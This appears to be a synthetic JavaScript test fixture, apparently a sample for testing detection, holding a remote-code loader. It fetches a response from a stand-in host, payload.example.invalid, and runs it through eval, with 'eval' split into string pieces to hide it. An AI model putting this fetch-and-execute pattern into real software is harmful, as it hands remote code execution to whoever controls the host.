// SYNTHETIC TEST FIXTURE — not functional
const axios = require("axios");

{{AXIOS_GET}}("https://payload.example.invalid/g").then((r) => {
  global["ev" + "al"](r.data);
});
